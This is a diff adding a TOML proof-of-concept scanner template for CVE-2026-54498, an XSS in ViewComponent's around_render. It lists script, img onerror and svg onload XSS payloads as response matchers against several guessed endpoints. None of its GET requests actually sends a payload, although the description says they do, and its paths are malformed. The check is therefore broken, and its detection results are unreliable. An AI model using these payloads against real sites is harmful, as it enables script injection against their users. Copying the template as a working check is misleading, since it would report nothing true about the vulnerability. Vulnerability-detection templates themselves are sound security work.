@@ -1,0 +1,152 @@
+[info]
+author = "AVE"
+description = "检测 ViewComponent 4.0.0-4.12.0 中 around_render HTML 安全绕过导致的 XSS 漏洞。通过向目标端点发送包含 XSS 载荷的 GET/POST 请求，检查响应中是否未转义反射了恶意脚本标记，从而确认漏洞存在。"
+id = "POC-AVE-2026-0563"
+name = "ViewComponent around_render HTML-Safety Bypass XSS PoC"
+severity = "high"
+tags = [
+    "cve-2026-54498",
+    "xss",
+    "view-component",
+    "rails",
+]
+vuln_id = [
+    "CVE-2026-54498",
+    "AVE-2026-0563",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/search"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "text/html"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS_MARKER_12345')</script>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/q"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "text/html"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert('XSS_MARKER_12345')>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/query"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "text/html"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<svg/onload=alert('XSS_MARKER_12345')>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/users"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "text/html"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS_MARKER_12345')</script>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/posts"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "text/html"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS_MARKER_12345')</script>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/comments"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "text/html"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS_MARKER_12345')</script>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rails/view_components"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "text/html"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["view_component"]
